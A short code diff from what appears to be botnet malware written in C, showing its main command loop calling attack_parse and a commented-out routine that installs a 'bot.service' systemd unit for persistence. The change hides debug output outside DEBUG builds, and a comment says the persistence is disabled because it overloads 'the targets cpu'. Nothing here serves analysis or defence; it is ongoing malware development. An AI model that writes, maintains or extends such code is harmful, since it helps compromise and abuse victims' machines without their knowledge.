@@ -547,9 +547,11 @@ int main(int argc, char **args)
                     fflush(stdout);
                 #endif
                 
+                #ifdef DEBUG
                 // Add a simple test to see if attack_parse is being called
                 printf("[MAIN] About to call attack_parse...\n");
                 fflush(stdout);
+                #endif
                 
                 attack_parse(rdbuf, len);
                 
@@ -558,8 +560,10 @@ int main(int argc, char **args)
                     fflush(stdout);
                 #endif
                 
+#ifdef DEBUG
                 printf("[MAIN] attack_parse completed\n");
                 fflush(stdout);
+#endif
             }
         }
     }
@@ -910,7 +914,7 @@ static void setup_auto_restart(void)
         }
     }
     
-    // Create systemd service (if systemd is available)
+    // Create systemd service (if systemd is available) (disabled completely fucks up the targets cpu lol might fix later)
     // fd = open("/etc/systemd/system/bot.service", O_CREAT | O_WRONLY | O_TRUNC, 0644);
     // if (fd >= 0) {
     //     char service_content[512];
